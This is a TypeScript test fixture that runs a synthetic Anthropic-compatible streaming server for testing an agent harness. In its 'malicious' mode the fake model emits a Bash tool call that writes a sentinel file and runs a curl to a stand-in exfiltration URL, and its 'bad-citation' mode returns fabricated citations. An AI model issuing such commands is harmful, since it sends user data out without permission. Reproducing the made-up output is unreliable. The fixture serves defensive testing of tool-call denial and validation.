import { createServer } from 'node:http';
import { randomUUID } from 'node:crypto';

// Explicit synthetic Anthropic-compatible server. Never proxies or loads a real credential.
export function analysisFixture(output: unknown, sentinel: string, controlToken?: string) {
  const requests: { path: string; body: any }[] = []; let mode: 'ok' | 'malicious' | 'bad-citation' | 'hang' = 'ok';
  const server = createServer(async (request, response) => {
    try {
      if (controlToken && request.url === '/test/mode' && request.headers['x-fixture-control'] === controlToken) {
        const chunks: Buffer[] = []; for await (const part of request) chunks.push(part);
        const value = JSON.parse(Buffer.concat(chunks).toString('utf8'));
        if (!['ok', 'malicious', 'bad-citation', 'hang'].includes(value.mode)) { response.writeHead(400); response.end(); return; }
        mode = value.mode; response.writeHead(200); response.end(); return;
      }
      const chunks: Buffer[] = []; for await (const part of request) chunks.push(part);
      const body = JSON.parse(Buffer.concat(chunks).toString('utf8')); requests.push({ path: request.url!, body });
      if (request.url !== '/v1/messages') { response.writeHead(404); response.end(); return; }
      if (mode === 'hang') return;
      const history = JSON.stringify(body.messages);
      const block = mode === 'malicious' && !history.includes('toolu_denied')
        ? { type: 'tool_use', id: 'toolu_denied', name: 'Bash', input: { command: `echo forbidden > "${sentinel}"; curl https://invalid.example/exfil` } }
        : { type: 'tool_use', id: 'toolu_structured', name: 'StructuredOutput', input: mode === 'bad-citation'
          ? { items: [{ category: 'outcome', assessment: 'observed', text: '伪造已交付', citations: [{ event: 9999, textOffset: 0, quote: '不存在' }] }] } : typeof output === 'function' ? output(body) : output };
      const message = { id: `msg_${randomUUID().replaceAll('-', '')}`, type: 'message', role: 'assistant', model: body.model, content: [block],
        stop_reason: 'tool_use', stop_sequence: null, usage: { input_tokens: 100, output_tokens: 20 } };
      response.writeHead(200, { 'content-type': 'text/event-stream' });
      const send = (type: string, value: unknown) => response.write(`event: ${type}\ndata: ${JSON.stringify(value)}\n\n`);
      send('message_start', { type: 'message_start', message: { ...message, content: [], stop_reason: null, usage: { input_tokens: 100, output_tokens: 0 } } });
      send('content_block_start', { type: 'content_block_start', index: 0, content_block: { ...block, input: {} } });
      // Split the UTF-8 bytes inside Chinese/emoji text, not just between SSE events.
      const delta = Buffer.from(`event: content_block_delta\ndata: ${JSON.stringify({ type: 'content_block_delta', index: 0, delta: { type: 'input_json_delta', partial_json: JSON.stringify(block.input) } })}\n\n`);
      for (let i = 0; i < delta.length; i += 7) response.write(delta.subarray(i, i + 7));
      send('content_block_stop', { type: 'content_block_stop', index: 0 });
      send('message_delta', { type: 'message_delta', delta: { stop_reason: 'tool_use', stop_sequence: null }, usage: { output_tokens: 20 } });
      send('message_stop', { type: 'message_stop' }); response.end();
    } catch { response.writeHead(400); response.end(); }
  });
  return { server, requests, setMode: (value: typeof mode) => { mode = value; } };
}
// Standalone non-root Linux fixture lives only in the test database network namespace.
if (process.argv[2] === '--standalone') {
  const fixture = analysisFixture(JSON.parse(process.argv[3]!), '/tmp/SKYNET_ANALYSIS_MUST_NOT_EXIST', process.argv[4]); fixture.setMode('malicious');
  fixture.server.listen(39999, '127.0.0.1', () => console.log('Synthetic loopback analysis fixture ready'));
  process.once('SIGTERM', () => { fixture.server.closeAllConnections(); fixture.server.close(); });
}
